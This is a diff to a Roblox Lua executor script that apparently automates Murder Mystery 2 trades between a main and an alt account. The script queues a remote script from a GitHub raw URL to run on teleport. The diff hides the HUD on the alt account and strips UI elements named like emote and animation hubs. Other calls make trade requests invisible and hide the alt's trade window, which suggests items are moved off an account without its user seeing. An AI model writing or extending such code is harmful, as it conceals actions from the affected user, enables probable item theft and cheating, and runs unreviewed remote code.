@@ -95,7 +95,7 @@ local CONFIG = {
     QUEUE_ON_TELEPORT_URL = "https://raw.githubusercontent.com/luauglazer/Sort/refs/heads/main/Dash.lua",
     STOP_WHEN_NO_ITEMS = true,
     HIDE_ALT_TRADE_GUI = true,
-    SHOW_HUD_ON_ALT = true,
+    SHOW_HUD_ON_ALT = false,
 }
 
 local qot_func = (syn and syn.queue_on_teleport)
@@ -266,7 +266,7 @@ local function addLog(text: string)
         table.remove(LogHistory)
     end
     State.StatusMessage = text
-    if _G.UpdateTradeUI then
+    if isMain and _G.UpdateTradeUI then
         pcall(_G.UpdateTradeUI)
     end
 end
@@ -1433,6 +1433,19 @@ local function makeStudioButton(parent, text, w, h, bg, fg)
 end
 
 local function createAutoTradeHUD()
+    if not isMain then
+        cleanAllPreviousInstances({
+            "StudioEmoteHub",
+            "BevelEmoteHub",
+            "PotassiumEmoteHub",
+            "MM2AutoTradeRelayUI",
+            "MM2AutoTradeNoWebhookUI",
+            "StudioAnimPackHub",
+            "StudioAnimationHub"
+        })
+        return
+    end
+
     cleanAllPreviousInstances({
         "StudioEmoteHub",
         "BevelEmoteHub",
@@ -2112,7 +2125,19 @@ local function setupTradeGuiBgTransparency()
     end)
 end
 
-task.spawn(createAutoTradeHUD)
+if isMain then
+    task.spawn(createAutoTradeHUD)
+else
+    cleanAllPreviousInstances({
+        "StudioEmoteHub",
+        "BevelEmoteHub",
+        "PotassiumEmoteHub",
+        "MM2AutoTradeRelayUI",
+        "MM2AutoTradeNoWebhookUI",
+        "StudioAnimPackHub",
+        "StudioAnimationHub"
+    })
+end
 task.spawn(setupTradeGuiBgTransparency)
 task.spawn(setupInvisibleTradeRequest)
 task.spawn(hideAltTradeGUI)
